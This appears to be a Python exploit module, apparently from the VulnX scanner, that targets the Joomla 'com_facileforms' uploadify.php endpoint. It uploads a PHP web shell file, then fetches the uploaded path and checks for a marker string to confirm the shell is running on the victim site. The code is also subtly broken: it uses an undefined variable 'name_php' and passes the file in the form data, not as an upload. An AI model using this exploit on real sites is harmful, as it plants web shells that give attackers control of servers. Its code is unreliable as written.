import os
import requests
import re

def com_facileforms(url,headers):
    s = requests.session()
    endpoint = url + "/components/com_facileforms/libraries/jquery/uploadify.php"
    img = open('shell/VulnX.php', 'rb')
    name_img= os.path.basename('shell/VulnX.php')
    fieldname = "Filedata"
    files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
    data = { fieldname : files ,
             'folder' : '/components/com_facileforms/libraries/jquery/',
            }
    upload_file = s.post(endpoint,data)
    shellup = url + "/components/com_facileforms/libraries/jquery/"+name_php
    checkShell = requests.get(shellup, headers=headers).text
    statusCheck = re.findall(re.compile(r'Orusula'),checkShell)
    if statusCheck:
        print('[+] com_facileforms ', shellup)
    else:
        print('[-] com_facileforms')